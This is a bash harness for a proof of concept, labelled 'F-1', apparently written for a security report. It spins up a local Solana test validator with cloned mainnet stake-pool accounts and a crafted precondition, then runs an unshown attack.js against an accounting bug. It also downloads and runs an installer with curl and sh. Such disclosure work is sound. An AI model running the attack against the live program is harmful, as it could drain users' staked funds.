#!/usr/bin/env bash
# F-1 PoC — local solana-test-validator seeded with cloned mainnet accounts + crafted
# precondition (validator-list record 0 = DeactivatingValidator, stake still active).
# Proves the deployed v1.0.0 accounting bug is exploitable by a fresh keypair the moment
# the staker removes a validator. Read-only against mainnet (clones only).
set -uo pipefail
cd "$(dirname "$0")/../.."   # phase-stake/
mkdir -p ci-out

# --- deps (temp dir, never committed) ---
DEPS="$(mktemp -d /tmp/f1-deps.XXXXXX)"
( cd "$DEPS" && npm init -y >/dev/null 2>&1 && npm install --no-audit --no-fund --loglevel=error @solana/web3.js@1 >/dev/null 2>&1 )
export NODE_PATH="$DEPS/node_modules"

# --- solana toolchain ---
export PATH="$HOME/.local/share/solana/install/active_release/bin:$PATH"
if ! command -v solana-test-validator >/dev/null 2>&1; then
  echo "[f1] installing solana toolchain..."
  for url in "https://release.anza.xyz/stable/install" "https://release.solana.com/stable/install"; do
    if curl -sSfL "$url" -o /tmp/solana-install.sh; then
      sh /tmp/solana-install.sh >/dev/null 2>&1 && break
    fi
  done
  export PATH="$HOME/.local/share/solana/install/active_release/bin:$PATH"
fi
solana-test-validator --version || { echo "[f1] no test validator"; exit 1; }

# --- fetch + craft ---
node ci/f1/fetch_accounts.js || { echo "[f1] fetch failed"; exit 1; }
A=ci/f1/accounts

# --- start validator with clones ---
pkill -f solana-test-validator 2>/dev/null || true
sleep 1
solana-test-validator --reset \
  --clone-upgradeable-program SPMBzsVUuoHA4Jm6KunbsotaahvVikZs1JyTW6iJvbn \
  --account phaseeExd43yGjjad2FZSigdG9UTRpMdxS4aMerx821 "$A/vlist.json" \
  --account phasejkG1akKgqkLvfWzWY17evnH6mSWznnUspmpyeG "$A/pool.json" \
  --account phaseECAeXantYWXvRGkmeh7ddQsUJTf7DcywquY9Z2 "$A/reserve.json" \
  --account phaseZSfPxTDBpiVb96H4XFSD8xHeHxZre5HerehBJG "$A/mint.json" \
  --account GAGMZfQU5ArnaciyQBnDLsEpbbhpyqPR24t98WYL4n6U "$A/mgrfee.json" \
  --account 8QtQ1U34DPs2UKQiwUoRPMHnjJedsmdASZdbQHa7VHKh "$A/stake.json" \
  --url https://solana-rpc.publicnode.com \
  --rpc-port 8899 > ci-out/test-validator.log 2>&1 &
TVPID=$!

ok=0
for i in $(seq 1 90); do
  if solana cluster-version -u http://127.0.0.1:8899 >/dev/null 2>&1; then ok=1; break; fi
  if ! kill -0 "$TVPID" 2>/dev/null; then echo "[f1] validator died early"; break; fi
  sleep 2
done
if [ "$ok" -ne 1 ]; then
  echo "[f1] validator not ready"; tail -60 ci-out/test-validator.log; exit 1
fi
echo "[f1] validator ready"

node ci/f1/attack.js 2>&1 | tee ci-out/f1_poc.log
rc=${PIPESTATUS[0]}
kill "$TVPID" 2>/dev/null || true
echo "[f1] attack exit code: $rc"
exit $rc
